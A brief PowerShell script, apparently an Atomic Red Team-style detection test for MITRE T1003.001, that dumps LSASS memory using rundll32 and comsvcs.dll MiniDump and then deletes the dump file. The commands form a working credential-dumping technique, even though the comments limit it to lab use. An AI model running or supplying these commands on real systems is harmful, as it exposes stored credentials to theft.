# Test for T1003.001 - LSASS dump via comsvcs.dll MiniDump (Atomic Red Team method).
# Run in a lab/test VM as Administrator only. Your EDR/AV will likely block or alert - that is expected.
# The dump contains credentials; it is deleted immediately.
$id  = (Get-Process lsass).Id
$out = Join-Path $env:TEMP 'T1003001-lsass.dmp'
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $id $out full
Start-Sleep -Seconds 3
Remove-Item $out -Force -ErrorAction SilentlyContinue
